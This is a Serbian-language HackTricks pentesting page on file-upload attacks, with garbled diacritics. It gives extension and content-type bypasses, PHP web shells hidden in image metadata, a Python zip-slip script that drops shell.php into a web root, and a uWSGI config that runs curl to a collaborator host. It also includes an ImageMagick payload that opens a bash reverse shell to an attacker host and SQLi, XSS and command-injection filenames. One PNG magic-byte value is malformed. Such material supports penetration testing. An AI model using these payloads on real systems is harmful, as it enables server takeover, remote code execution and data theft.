# Postavljanje datoteka

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ako ste zainteresovani za **hakersku karijeru** i hakovanje neuhvatljivog - **mi zapoÅ¡ljavamo!** (_potrebno je teÄno poznavanje pisanog i govornog poljskog jezika_).

{% embed url="https://www.stmcyber.com/careers" %}

## OpÅ¡ta metodologija postavljanja datoteka

Drugi korisni nastavci:

* **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
* **Rad u PHPv8**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
* **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
* **Flash**: _.swf_
* **Perl**: _.pl, .cgi_
* **Erlang Yaws Web Server**: _.yaws_

### ZaobilaÅ¾enje provere ekstenzija datoteka

1. Ako se primenjuju, **proverite** **prethodne ekstenzije.** TakoÄ‘e ih testirajte koristeÄ‡i neka **velika slova**: _pHp, .pHP5, .PhAr ..._
2. _Proverite **dodavanjem validne ekstenzije pre** ekstenzije izvrÅ¡enja (koristite i prethodne ekstenzije):_
* _file.png.php_
* _file.png.Php5_
3. PokuÅ¡ajte dodavanjem **specijalnih karaktera na kraju.** MoÅ¾ete koristiti Burp da **bruteforce-ujete** sve **ascii** i **Unicode** karaktere. (_Imajte na umu da moÅ¾ete pokuÅ¡ati koristiti i **prethodno** pomenute **ekstenzije**_)
* _file.php%20_
* _file.php%0a_
* _file.php%00_
* _file.php%0d%0a_
* _file.php/_
* _file.php.\\_
* _file._
* _file.php...._
* _file.pHp5...._
4. PokuÅ¡ajte da zaobiÄ‘ete zaÅ¡titu **prevareÄ‡i parser ekstenzija** na serverskoj strani tehnikama poput **udvajanja** **ekstenzije** ili dodavanja **beskorisnih** podataka (**nula** bajtova) izmeÄ‘u ekstenzija. _TakoÄ‘e moÅ¾ete koristiti **prethodne ekstenzije** da biste pripremili bolji payload._
* _file.png.php_
* _file.png.pHp5_
* _file.php#.png_
* _file.php%00.png_
* _file.php\x00.png_
* _file.php%0a.png_
* _file.php%0d%0a.png_
* _file.phpJunk123png_
5. Dodajte **joÅ¡ jedan sloj ekstenzija** prethodnoj proveri:
* _file.png.jpg.php_
* _file.php%00.png%00.jpg_
6. PokuÅ¡ajte da stavite **izvrÅ¡nu ekstenziju pre validne ekstenzije** i nadajte se da je server loÅ¡e konfigurisan. (korisno za iskoriÅ¡Ä‡avanje Apache konfiguracija gde Ä‡e bilo Å¡ta sa ekstenzijom\*\* _**.php**_**, ali** ne nuÅ¾no zavrÅ¡ava u .php\*\* izvrÅ¡iti kod):
* _npr: file.php.png_
7. KoriÅ¡Ä‡enje **NTFS alternativnog toka podataka (ADS)** u **Windows-u**. U ovom sluÄaju, karakter â€:â€œ Ä‡e biti ubaÄen posle zabranjene ekstenzije i pre dozvoljene. Kao rezultat, na serveru Ä‡e biti kreirana **prazna datoteka sa zabranjenom ekstenzijom** (npr. â€œfile.asax:.jpgâ€). Ova datoteka moÅ¾e biti kasnije izmenjena koriÅ¡Ä‡enjem drugih tehnika kao Å¡to je koriÅ¡Ä‡enje njenog kratkog imena. Obrazac â€œ**::$data**â€ takoÄ‘e moÅ¾e biti koriÅ¡Ä‡en za kreiranje nepraznih datoteka. Stoga, dodavanje taÄke nakon ovog obrasca takoÄ‘e moÅ¾e biti korisno za zaobilaÅ¾enje daljih restrikcija (npr. â€œfile.asp::$data.â€)
8. PokuÅ¡ajte da preÄ‘ete granice imena datoteke. Validna ekstenzija se odseÄe. A zlonamerni PHP ostaje. AAA<--SNIP-->AAA.php

```
# Maksimalno 255 bajtova na Linux-u
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # ovde oduzmite 4 i dodajte .png
# Postavite datoteku i proverite odgovor koliko karaktera dozvoljava. Recimo 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Napravite payload
AAA<--SNIP 232 A-->AAA.php.png
```
### Bypassovanje Content-Type, Magic Number, kompresija i promena veliÄine

* Bypassovanje provere **Content-Type** podeÅ¡avanjem **vrednosti** zaglavlja **Content-Type** na: _image/png_, _text/plain_, application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
* Bypassovanje provere **magic number** dodavanjem na poÄetak datoteke **bajtova prave slike** (zbunite _file_ komandu). Ili uvedite shell unutar **metapodataka**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` ili takoÄ‘e moÅ¾ete **ubaciti payload direktno** u sliku:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
* Ako se **kompresija dodaje vaÅ¡oj slici**, na primer koriÅ¡Ä‡enjem standardnih PHP biblioteka poput [PHP-GD](https://www.php.net/manual/fr/book.image.php), prethodne tehnike neÄ‡e biti korisne. MeÄ‘utim, moÅ¾ete koristiti **PLTE chunk** [**tehniku definisanu ovde**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubacite tekst koji Ä‡e **preÅ¾iveti kompresiju**.
* [**Github sa kodom**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_plte\_png.php)
* Veb stranica takoÄ‘e moÅ¾e **promeniti veliÄinu** slike, koristeÄ‡i na primer PHP-GD funkcije `imagecopyresized` ili `imagecopyresampled`. MeÄ‘utim, moÅ¾ete koristiti **IDAT chunk** [**tehniku definisanu ovde**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubacite tekst koji Ä‡e **preÅ¾iveti kompresiju**.
* [**Github sa kodom**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_idat\_png.php)
* JoÅ¡ jedna tehnika za stvaranje payloada koji **preÅ¾ivljava promenu veliÄine slike**, koristeÄ‡i PHP-GD funkciju `thumbnailImage`. MeÄ‘utim, moÅ¾ete koristiti **tEXt chunk** [**tehniku definisanu ovde**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubacite tekst koji Ä‡e **preÅ¾iveti kompresiju**.
* [**Github sa kodom**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_tEXt\_png.php)

### Ostali trikovi za proveru

* PronaÄ‘ite ranjivost da **preimenujete** veÄ‡ otpremljenu datoteku (da promenite ekstenziju).
* PronaÄ‘ite ranjivost **Lokalnog ukljuÄivanja datoteka** za izvrÅ¡avanje backdoor-a.
* **MoguÄ‡e otkrivanje informacija**:
1. Otpremite **viÅ¡e puta** (i **istovremeno**) **istu datoteku** sa **istim imenom**
2. Otpremite datoteku sa **imenom** datoteke ili **foldera** koji **veÄ‡ postoje**
3. Otpremite datoteku sa **â€œ.â€, â€œ..â€, ili â€œâ€¦â€ kao imenom**. Na primer, u Apache-u na **Windows-u**, ako aplikacija Äuva otpremljene datoteke u direktorijumu â€œ/www/uploads/â€, ime â€œ.â€ Ä‡e kreirati datoteku nazvanu â€œuploadsâ€ u direktorijumu â€œ/www/â€.
4. Otpremite datoteku koja se moÅ¾da ne moÅ¾e lako obrisati kao Å¡to je **â€œâ€¦:.jpgâ€** u **NTFS**-u. (Windows)
5. Otpremite datoteku u **Windows-u** sa **nevaÅ¾eÄ‡im karakterima** poput `|<>*?â€` u imenu. (Windows)
6. Otpremite datoteku u **Windows-u** koristeÄ‡i **rezervisana** (**zabranjena**) **imena** poput CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 i LPT9.
* PokuÅ¡ajte takoÄ‘e da **otpremite izvrÅ¡nu** (.exe) ili **.html** (manje sumnjivo) datoteku koja Ä‡e **izvrÅ¡iti kod** kada je sluÄajno otvorena od strane Å¾rtve.

### Specijalni trikovi sa ekstenzijama

Ako pokuÅ¡avate da otpremite datoteke na **PHP server**, [pogledajte trik sa **.htaccess** za izvrÅ¡avanje koda](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess).\
Ako pokuÅ¡avate da otpremite datoteke na **ASP server**, [pogledajte trik sa **.config** za izvrÅ¡avanje koda](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` datoteke su kao `.jar` za javu, ali za php, i mogu se **koristiti kao php datoteke** (izvrÅ¡avanje ih sa php-om, ili ukljuÄivanje unutar skripte...)

Ekstenzija `.inc` se ponekad koristi za php datoteke koje se koriste samo za **uvoz datoteka**, tako da, u nekom trenutku, neko bi mogao dozvoliti **ovu ekstenziju da se izvrÅ¡i**.

## **Jetty RCE**

Ako moÅ¾ete otpremiti XML datoteku na Jetty server, moÅ¾ete dobiti [RCE jer se **nove \*.xml i \*.war automatski obraÄ‘uju**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Dakle, kao Å¡to je navedeno na sledeÄ‡oj slici, otpremite XML datoteku u `$JETTY_BASE/webapps/` i oÄekujte shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../.gitbook/assets/image (1) (3) (1) (1) (1).png>)

## **uWSGI RCE**

Za detaljno istraÅ¾ivanje ove ranjivosti pogledajte originalno istraÅ¾ivanje: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Ranjivosti za izvrÅ¡avanje udaljenih komandi (RCE) mogu se iskoristiti na uWSGI serverima ako imate moguÄ‡nost da izmenite `.ini` konfiguracionu datoteku. Konfiguracione datoteke uWSGI servera koriste specifiÄnu sintaksu za ukljuÄivanje "magiÄnih" promenljivih, mesta i operatora. Posebno, operator '@', koriÅ¡Ä‡en kao `@(filename)`, dizajniran je da ukljuÄi sadrÅ¾aj datoteke. MeÄ‘u razliÄitim podrÅ¾anim Å¡emama u uWSGI-ju, "exec" Å¡ema je posebno moÄ‡na, omoguÄ‡avajuÄ‡i Äitanje podataka iz standardnog izlaza procesa. Ova funkcionalnost moÅ¾e biti manipulisana u zlonamerne svrhe kao Å¡to su IzvrÅ¡avanje udaljenih komandi ili Pisanje/ÄŒitanje proizvoljnih datoteka kada se `.ini` konfiguraciona datoteka obraÄ‘uje.

Razmotrite sledeÄ‡i primer Å¡tetne `uwsgi.ini` datoteke, prikazujuÄ‡i razliÄite Å¡eme:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
IzvrÅ¡avanje payload-a se deÅ¡ava tokom parsiranja konfiguracionog fajla. Da bi konfiguracija bila aktivirana i parsirana, proces uWSGI mora biti ili restartovan (potencijalno nakon pada ili zbog napada DoS) ili fajl mora biti podeÅ¡en za automatsko ponovno uÄitavanje. Funkcija automatskog ponovnog uÄitavanja, ako je omoguÄ‡ena, ponovo uÄitava fajl u odreÄ‘enim intervalima nakon Å¡to detektuje promene.

VaÅ¾no je razumeti opuÅ¡tenu prirodu parsiranja konfiguracionog fajla uWSGI-ja. Konkretno, razmatrani payload moÅ¾e biti ubaÄen u binarni fajl (kao Å¡to je slika ili PDF), Å¡to dodatno proÅ¡iruje obim potencijalne eksploatacije.

## **Triks za otpremanje fajlova/SSRF trik pomoÄ‡u wget-a**

U nekim situacijama moÅ¾ete primetiti da server koristi **`wget`** za **preuzimanje fajlova** i moÅ¾ete **navesti** **URL**. U tim sluÄajevima, kod moÅ¾e proveravati da li je ekstenzija preuzetih fajlova unutar bele liste kako bi se osiguralo da Ä‡e biti preuzimani samo dozvoljeni fajlovi. MeÄ‘utim, **ova provera moÅ¾e biti zaobiÄ‘ena.**\
**Maksimalna** duÅ¾ina **imenovanja fajla** u **Linux-u** je **255**, meÄ‘utim, **wget** skraÄ‡uje imena fajlova na **236** karaktera. MoÅ¾ete **preuzeti fajl nazvan "A"\*232+".php"+".gif"**, ovo ime fajla Ä‡e **zaobiÄ‡i** **proveru** (kao u ovom primeru **".gif"** je **validna** ekstenzija) ali Ä‡e `wget` **preimenovati** fajl u **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: â€˜AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpâ€™

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - â€˜AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpâ€™ saved [10/10]
```
Imajte na umu da je **joÅ¡ jedna opcija** o kojoj moÅ¾ete razmiÅ¡ljati kako da zaobiÄ‘ete ovu proveru da **naterate HTTP server da preusmeri na drugi fajl**, tako da Ä‡e poÄetni URL zaobiÄ‡i proveru, a zatim Ä‡e wget preuzeti preusmereni fajl sa novim imenom. Ovo **neÄ‡e raditi** **osim ako** se wget koristi sa **parametrom** `--trust-server-names` jer Ä‡e **wget preuzeti preusmerenu stranicu sa imenom fajla naznaÄenim u originalnom URL-u**.

## Alati

* [Upload Bypass](https://github.com/sAjibuu/Upload\_Bypass) je moÄ‡an alat dizajniran da pomogne Pentesterima i Bug Hunterima u testiranju mehanizama za otpremanje fajlova. Koristi razliÄite tehnike nagradnih bagova kako bi pojednostavio proces identifikacije i iskoriÅ¡Ä‡avanja ranjivosti, obezbeÄ‘ujuÄ‡i temeljnu procenu veb aplikacija.

## Od otpremanja fajla do drugih ranjivosti

* Postavite **ime fajla** na `../../../tmp/lol.png` i pokuÅ¡ajte da postignete **traversiranje putanje**
* Postavite **ime fajla** na `sleep(10)-- -.jpg` i moÅ¾da Ä‡ete moÄ‡i da postignete **SQL injection**
* Postavite **ime fajla** na `<svg onload=alert(document.domain)>` da postignete XSS
* Postavite **ime fajla** na `; sleep 10;` da testirate neke tehnike ubacivanja komandi (viÅ¡e [triÄarija za ubacivanje komandi ovde](../command-injection.md))
* [**XSS** u fajlu sa slikom (svg) otpremanje](../xss-cross-site-scripting/#xss-uploading-files-svg)
* Otpremanje **JS** fajla + **XSS** = [eksploatacija **Service Workers**](../xss-cross-site-scripting/#xss-abusing-service-workers)
* [**XXE u otpremanju svg**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* [**Otvoreno preusmeravanje** putem otpremanja svg fajla](../open-redirect.md#open-redirect-uploading-svg-files)
* Isprobajte **razliÄite svg payload-e** sa [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)\*\*\*\*
* [ÄŒuvena ranjivost **ImageTrick**](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* Ako moÅ¾ete **navesti veb server da uhvati sliku sa URL-a** moÅ¾ete pokuÅ¡ati da iskoristite [SSRF](../ssrf-server-side-request-forgery/). Ako Ä‡e se ova **slika** saÄuvati na nekom **javnom** sajtu, takoÄ‘e moÅ¾ete navesti URL sa [https://iplogger.org/invisible/](https://iplogger.org/invisible/) i **ukrasti informacije o svakom posetiocu**.
* [**XXE i CORS** zaobilaÅ¾enje sa otpremanjem PDF-Adobe fajla](pdf-upload-xxe-and-cors-bypass.md)
* Posebno oblikovani PDF-ovi za XSS: [SledeÄ‡a stranica prikazuje kako **ubaciti PDF podatke da biste dobili izvrÅ¡enje JS**](../xss-cross-site-scripting/pdf-injection.md). Ako moÅ¾ete da otpremite PDF-ove, moÅ¾ete pripremiti neki PDF koji Ä‡e izvrÅ¡iti proizvoljni JS prateÄ‡i date upute.
* Otpremite \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) sadrÅ¾aj da proverite da li server ima **antivirus**
* Proverite da li postoji neko ograniÄenje **veliÄine** prilikom otpremanja fajlova

Evo liste od 10 stvari koje moÅ¾ete postiÄ‡i otpremanjem (sa [ovde](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Ekstenzija

{% embed url="https://github.com/portswigger/upload-scanner" %}

## ÄŒarobni bajtovi zaglavlja

* **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG**: `"\xff\xd8\xff"`

Pogledajte [https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures) za druge tipove fajlova.

### Zip/Tar Fajl Automatski dekompresovan prilikom otpremanja

Ako moÅ¾ete otpremiti ZIP koji Ä‡e biti dekompresovan unutar servera, moÅ¾ete uraditi 2 stvari:

#### SimboliÄka veza

Otpremite link koji sadrÅ¾i softverske veze ka drugim fajlovima, zatim, pristupajuÄ‡i dekompresovanim fajlovima, pristupiÄ‡ete povezanim fajlovima:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Dekompresovanje u razliÄite fascikle

NeoÄekivano kreiranje fajlova u direktorijumima tokom dekompresije predstavlja znaÄajan problem. Uprkos poÄetnim pretpostavkama da ovaj postupak moÅ¾e zaÅ¡tititi od izvrÅ¡avanja komandi na nivou OS putem zlonamernih uploadovanih fajlova, hijerarhijska podrÅ¡ka za kompresiju i sposobnosti pretrage direktorijuma ZIP arhivnog formata mogu biti iskoriÅ¡Ä‡ene. Ovo omoguÄ‡ava napadaÄima da zaobiÄ‘u restrikcije i pobegnu iz bezbednih direktorijuma za upload manipuliÅ¡uÄ‡i funkcionalnostima dekompresije ciljne aplikacije.

Automatizovani eksploit za kreiranje takvih fajlova dostupan je na [**evilarc na GitHub-u**](https://github.com/ptoomey3/evilarc). Alat se moÅ¾e koristiti na sledeÄ‡i naÄin:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Dodatno, **simboliÄka veza trik sa evilarc-om** je opcija. Ako je cilj da se cilja datoteka poput `/flag.txt`, simboliÄka veza ka toj datoteci treba biti kreirana na vaÅ¡em sistemu. Ovo osigurava da evilarc ne naiÄ‘e na greÅ¡ke tokom svog rada.

Ispod je primer Python koda koji se koristi za kreiranje zlonamernog zip fajla:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Zloupotreba kompresije za prskanje fajlova**

Za dodatne detalje **proverite originalni post na**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1. **Kreiranje PHP Shell-a**: PHP kod je napisan da izvrÅ¡i komande prosleÄ‘ene kroz promenljivu `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```
2. **Prskanje Fajlova i Kreiranje Kompresovanog Fajla**: Kreiraju se viÅ¡e fajlova i sastavlja se zip arhiva koja sadrÅ¾i ove fajlove.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```
3. **Modifikacija pomoÄ‡u Hex Editora ili vi**: Imena fajlova unutar zip arhive se menjaju koriÅ¡Ä‡enjem vi ili hex editora, menjajuÄ‡i "xxA" u "../" kako bi se pretraÅ¾ivali direktorijumi.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## UgraÄ‘ivanje PHP Shell-a u PNG

UgraÄ‘ivanje PHP Shell-a u IDAT blok PNG datoteke moÅ¾e efikasno zaobiÄ‡i odreÄ‘ene operacije obrade slika. Funkcije `imagecopyresized` i `imagecopyresampled` iz PHP-GD su posebno relevantne u ovom kontekstu, jer se Äesto koriste za promenu veliÄine i uzorkovanje slika. MoguÄ‡nost ugraÄ‘enog PHP Shell-a da ostane neizmenjen nakon ovih operacija predstavlja znaÄajnu prednost za odreÄ‘ene sluÄajeve upotrebe.

Detaljno istraÅ¾ivanje ove tehnike, ukljuÄujuÄ‡i metodologiju i potencijalne primene, pruÅ¾a se u sledeÄ‡em Älanku: ["Kodiranje Web Shell-ova u PNG IDAT blokovima"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Ovaj resurs nudi sveobuhvatno razumevanje procesa i njegovih implikacija.

ViÅ¡e informacija na: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Poliglotne Datoteke

Poliglotne datoteke sluÅ¾e kao jedinstveno sredstvo u kibernetiÄkoj bezbednosti, delujuÄ‡i kao kameleoni koji mogu validno postojati u viÅ¡e formata datoteka istovremeno. Zanimljiv primer je [GIFAR](https://en.wikipedia.org/wiki/Gifar), hibrid koji funkcioniÅ¡e kao GIF i RAR arhiva istovremeno. Takve datoteke nisu ograniÄene samo na ovu kombinaciju; kombinacije poput GIF-a i JS-a ili PPT-a i JS-a su takoÄ‘e izvodljive.

Osnovna korist poliglotnih datoteka leÅ¾i u njihovoj sposobnosti da zaobiÄ‘u sigurnosne mere koje filtriraju datoteke na osnovu tipa. UobiÄajena praksa u razliÄitim aplikacijama podrazumeva dozvoljavanje samo odreÄ‘enih tipova datoteka za otpremanje - poput JPEG-a, GIF-a ili DOC-a - kako bi se umanjio rizik od potencijalno Å¡tetnih formata (npr. JS, PHP ili Phar datoteke). MeÄ‘utim, poliglot, pridrÅ¾avajuÄ‡i se strukturnih kriterijuma viÅ¡e tipova datoteka, moÅ¾e prikriveno zaobiÄ‡i ove restrikcije.

Iako su prilagodljive, poligloti se suoÄavaju sa odreÄ‘enim ograniÄenjima. Na primer, iako poliglot moÅ¾e istovremeno predstavljati PHAR datoteku (PHp ARhiva) i JPEG, uspeh njenog otpremanja moÅ¾e zavisiti od politike ekstenzija datoteka platforme. Ako sistem strogo pridrÅ¾ava dozvoljene ekstenzije, sama strukturalna dvojnost poliglota moÅ¾da neÄ‡e biti dovoljna da garantuje njeno otpremanje.

ViÅ¡e informacija na: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

## Reference

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
* [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
* [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ako vas zanima **hakerska karijera** i hakovanje neuhvatljivog - **zapoÅ¡ljavamo!** (_potrebno je teÄno poznavanje poljskog jezika, kako pisano tako i govorno_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

